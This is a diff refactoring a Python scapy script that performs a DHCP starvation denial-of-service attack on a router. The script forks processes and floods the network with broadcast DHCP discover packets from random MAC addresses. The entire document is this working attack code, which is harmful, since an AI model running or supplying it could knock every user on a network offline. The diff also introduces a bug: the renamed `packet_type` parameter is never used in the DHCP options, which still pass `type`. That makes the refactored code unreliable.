@@ -4,43 +4,45 @@ import argparse
 import os
 import time
 
-from scapy.config import conf
-from scapy.layers.dhcp import BOOTP, DHCP
-from scapy.layers.inet import IP, UDP
-from scapy.layers.l2 import Ether, getmacbyip
-from scapy.sendrecv import sendp
-from scapy.volatile import RandMAC
+import scapy.config
+import scapy.layers.dhcp
+import scapy.layers.inet
+import scapy.layers.l2
+import scapy.sendrecv
+import scapy.volatile
 
 
 class Starve:
+    """Starve"""
+
     # Real router
-    __GATEWAY_IP: str
-    __GATEWAY_MAC: str
+    __gateway_ip: str
+    __gateway_mac: str
 
     def __init__(self):
-        self.__GATEWAY_IP = conf.route.route("0.0.0.0")[2]
+        self.__gateway_ip = scapy.config.conf.route.route("0.0.0.0")[2]
 
-    def starvationAttack(self, delay, iteration, forks):
+    def starvation_attack(self, delay, iteration_count, fork_count):
         """DoS router -- DHCP starvation attack"""
-        for _ in range(forks):
+        for _ in range(fork_count):
             os.fork()
 
-        for _ in range(iteration):
-            request = self.generatePacketClient("discover", RandMAC())
-            sendp(request)
+        for _ in range(iteration_count):
+            request = self.generate_packet_client("discover", scapy.volatile.RandMAC())
+            scapy.sendrecv.sendp(request)
             time.sleep(int(delay))
 
-    def generatePacketClient(self, type, mac):
+    def generate_packet_client(self, packet_type, mac):
         """Return a DHCP a client packet"""
         return (
-            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
-            / IP(src="0.0.0.0", dst="255.255.255.255")
-            / UDP(sport=68, dport=67)
-            / BOOTP(chaddr=mac)
-            / DHCP(
+            scapy.layers.l2.Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
+            / scapy.layers.inet.IP(src="0.0.0.0", dst="255.255.255.255")
+            / scapy.layers.inet.UDP(sport=68, dport=67)
+            / scapy.layers.dhcp.BOOTP(chaddr=mac)
+            / scapy.layers.dhcp.DHCP(
                 options=[
                     ("message-type", type),
-                    ("server_id", self.__GATEWAY_IP),
+                    ("server_id", self.__gateway_ip),
                     "end",
                 ]
             )
@@ -84,4 +86,4 @@ if __name__ == "__main__":
         forks = args.forks
 
     s = Starve()
-    s.starvationAttack(seconds, int(iteration), forks)
+    s.starvation_attack(seconds, int(iteration), forks)
